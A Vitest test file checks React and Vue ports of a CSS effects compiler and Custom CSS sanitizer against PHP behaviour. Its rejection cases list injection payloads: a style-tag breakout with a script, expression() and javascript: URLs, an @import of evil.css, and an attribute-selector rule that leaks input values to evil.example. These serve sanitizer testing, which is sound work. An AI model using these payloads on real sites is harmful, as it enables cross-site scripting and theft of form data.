/**
 * Block effects + Custom CSS (#881) — pins the React and Vue twins of
 * `EffectsCompiler` / `CustomCssSanitizer` to the PHP behaviour.
 */

import { describe, expect, it } from 'vitest';

import * as react from '../src/support/effects';
import * as vue from '../../visual-editor-renderer-vue/src/support/effects';

describe.each([
    ['react', react],
    ['vue', vue],
])('%s effects', (_name, impl) => {
    it('compiles every effect in the PHP order', () => {
        const result = impl.compileEffects({
            artisanpackEffects: {
                textClip: true,
                clipShape: 'circle',
                zIndex: 5,
                isolation: true,
                mixBlendMode: 'multiply',
                backdropSaturate: 180,
                backdropBlur: 12,
                overflowY: 'auto',
                overflowX: 'hidden',
                opacity: 80,
            },
            gradient: 'vivid-cyan-blue-to-vivid-purple',
        });

        expect(result?.css).toBe(
            `.${result?.className}{opacity:0.8;overflow-x:hidden;overflow-y:auto;` +
                '-webkit-backdrop-filter:blur(12px) saturate(180%);backdrop-filter:blur(12px) saturate(180%);' +
                'mix-blend-mode:multiply;isolation:isolate;z-index:5;clip-path:circle(50% at 50% 50%);' +
                '-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}' +
                `:where(.${result?.className}){position:relative}` +
                `@media (forced-colors:active){.${result?.className}{-webkit-text-fill-color:currentColor;` +
                '-webkit-background-clip:border-box;background-clip:border-box}}'
        );
    });

    it('drops text clip when the block paints no gradient or background image', () => {
        expect(impl.compileEffects({ artisanpackEffects: { textClip: true } })).toBeNull();
        expect(impl.compileEffects({ artisanpackEffects: { textClip: true, opacity: 50 } })?.css).not.toContain(
            'transparent'
        );
        expect(impl.compileEffects({ artisanpackEffects: { textClip: true }, gradient: '' })).toBeNull();
        expect(
            impl.compileEffects({ artisanpackEffects: { textClip: true }, style: { color: { background: '#000' } } })
        ).toBeNull();
    });

    it.each([
        ['preset gradient', { gradient: 'cool-to-warm' }],
        ['custom gradient', { style: { color: { gradient: 'linear-gradient(red, blue)' } } }],
        ['image object', { style: { background: { backgroundImage: { url: 'https://example.com/a.png' } } } }],
        ['image string', { style: { background: { backgroundImage: 'https://example.com/a.png' } } }],
    ])('keeps text clip with a forced-colors fallback over a %s', (_label, attributes) => {
        const result = impl.compileEffects({ artisanpackEffects: { textClip: true }, ...attributes });

        expect(result?.css).toBe(
            `.${result?.className}{-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}` +
                `@media (forced-colors:active){.${result?.className}{-webkit-text-fill-color:currentColor;` +
                '-webkit-background-clip:border-box;background-clip:border-box}}'
        );
    });

    it('lets the caller say whether the block paints a background', () => {
        const effects = { artisanpackEffects: { textClip: true } };

        expect(impl.compileEffects(effects, { hasBackgroundFill: true })?.css).toContain('background-clip:text');
        expect(impl.compileEffects({ ...effects, gradient: 'cool-to-warm' }, { hasBackgroundFill: false })).toBeNull();
        expect(impl.hasBackgroundFill({})).toBe(false);
        expect(impl.hasBackgroundFill({ style: 'nope', gradient: 5 })).toBe(false);
        expect(impl.hasBackgroundFill({ style: { background: { backgroundImage: { url: '' } } } })).toBe(false);
        expect(impl.hasBackgroundFill(null)).toBe(false);
    });

    it('matches PHP on Unicode whitespace', () => {
        const nbsp = impl.compileEffects({ artisanpackEffects: { customCss: '\u00a0' } });

        expect(nbsp?.css).toBe(`.${nbsp?.className}{\u00a0}`);
        expect(impl.sanitizeCustomCss('\u00a0')).toBe('\u00a0');
        expect(impl.sanitizeCustomCss('\u2003 ')).toBe('\u2003');
        expect(impl.sanitizeCustomCss('\0\u000b ')).toBe('');
        expect(impl.compileEffects({ artisanpackEffects: { zIndex: '\u00a05' } })).toBeNull();
        expect(impl.compileEffects({ artisanpackEffects: { opacity: '\u00a050' } })).toBeNull();
        expect(impl.compileEffects({ artisanpackEffects: { opacity: '\u200950' } })).toBeNull();
        expect(impl.compileEffects({ artisanpackEffects: { zIndex: ' 5\t' } })?.css).toContain('{z-index:5}');
        expect(impl.compileEffects({ artisanpackEffects: { opacity: '\u000b50\f' } })?.css).toContain('opacity:0.5}');
    });

    it('clamps and rounds like PHP', () => {
        expect(impl.compileEffects({ artisanpackEffects: { opacity: 150 } })?.css).toContain('opacity:1}');
        expect(impl.compileEffects({ artisanpackEffects: { opacity: '7' } })?.css).toContain('opacity:0.07}');
        expect(impl.compileEffects({ artisanpackEffects: { opacity: 0 } })?.css).toContain('opacity:0}');
        expect(impl.compileEffects({ artisanpackEffects: { zIndex: -2.5 } })?.css).toContain('z-index:-3}');
        expect(impl.compileEffects({ artisanpackEffects: { opacity: 'half' } })).toBeNull();
    });

    it.each([
        ['  color: red;\n\tpadding: 1rem;  ', 'color: red; padding: 1rem;'],
        ['& > img {\n  border-radius: 50%;\n}', '& > img { border-radius: 50%; }'],
        ['@media (max-width: 600px) { & { display: none; } }', '@media (max-width: 600px) { & { display: none; } }'],
        ['color: red; /* note */ margin: 0;', 'color: red; margin: 0;'],
        ['content: "a  {  b";', 'content: "a  {  b";'],
        ['background: url("https://example.com/a.png");', 'background: url("https://example.com/a.png");'],
        ["background: URL( 'a.png' );", "background: URL( 'a.png' );"],
        ['content:"("', 'content:"("'],
        ['content:"[x"', 'content:"[x"'],
        ["content:'}'", "content:'}'"],
        ['width: calc(100% - var(--gap, 1rem));', 'width: calc(100% - var(--gap, 1rem));'],
        ['& a[href^="http"] { color: red; }', '& a[href^="http"] { color: red; }'],
        ['content: "url(x)";', 'content: "url(x)";'],
        ['& :is(a, [data-x="]"]) { color: red; /* ) */ }', '& :is(a, [data-x="]"]) { color: red; }'],
    ])('accepts %j', (input, expected) => {
        expect(impl.sanitizeCustomCss(input)).toBe(expected);
    });

    it.each([
        'color: red; } body { display: none',
        '& img { color: red;',
        'color: red; </style><script>alert(1)</script>',
        'content: "\\7d";',
        'content: "abc;',
        'content: "a\nb";',
        'color: red; /* open',
        '@import url(evil.css);',
        '@keyframes spin { to { rotate: 1turn; } }',
        'width: expression(alert(1));',
        'background: url(javascript:alert(1));',
        'background: url(https://example.com/a.png);',
        'background: URL(a.png);',
        'background: url(/* x */"a.png");',
        'a:url({);} body{background:red} y{a:url(})',
        "a:url(x'){}'",
        'color: rgb(',
        'a[href{}',
        'a)',
        'a]',
        'a:( { ) }',
        '& [x { ] }',
    ])('rejects %j', (input) => {
        expect(impl.sanitizeCustomCss(input)).toBeNull();
    });

    it.each([
        'background: url("https://example.com/a.png");',
        'background: URL("a.png");',
        'background: image-set("a.png" 1x);',
        'background: -webkit-image-set("a.png" 1x);',
        'background: image("a.png");',
        'background: src("a.png");',
        '& input[value^="a"] { background: url("https://evil.example/a"); }',
    ])('rejects %j when URLs are disallowed', (input) => {
        expect(impl.sanitizeCustomCss(input, true)).not.toBeNull();
        expect(impl.sanitizeCustomCss(input, false)).toBeNull();
    });

    it('still accepts URL-free CSS, and URLs inside strings, when URLs are disallowed', () => {
        expect(impl.sanitizeCustomCss('color: red; content: "url(x)";', false)).toBe('color: red; content: "url(x)";');
        expect(impl.sanitizeCustomCss('/* url("x") */ color: red;', false)).toBe('color: red;');
    });

    it('drops Custom CSS that loads a URL when the tree disallows URLs', () => {
        const tree = [
            {
                name: 'core/paragraph',
                attributes: { artisanpackEffects: { opacity: 50, customCss: 'background: url("a.png");' } },
                innerBlocks: [],
            },
        ];
        const allowed = impl.stampEffectsScopes(tree);
        const denied = impl.stampEffectsScopes(tree, { allowCustomCssUrls: false });
        const deniedClass = (denied.tree[0].attributes as Record<string, string>).className;

        expect(allowed.css).toContain('url("a.png")');
        expect(denied.css).toBe(`.${deniedClass}{opacity:0.5}`);
        expect(
            impl.compileEffects(tree[0].attributes, { allowCustomCssUrls: false })?.css
        ).toBe(`.${deniedClass}{opacity:0.5}`);
    });

    it('appends the scope to className and dedupes shared rules', () => {
        const { tree, css } = impl.stampEffectsScopes([
            { name: 'core/paragraph', attributes: { className: 'lead', artisanpackEffects: { opacity: 50 } }, innerBlocks: [] },
            { name: 'core/paragraph', attributes: { artisanpackEffects: { opacity: 50 } }, innerBlocks: [] },
        ]);
        const first = (tree[0].attributes as Record<string, string>).className;
        const second = (tree[1].attributes as Record<string, string>).className;

        expect(first).toMatch(/^lead ve-fx-[0-9a-f]{12}$/);
        expect(second).toBe(first.replace('lead ', ''));
        expect(css.match(/\.ve-fx-/g)).toHaveLength(1);
    });
});
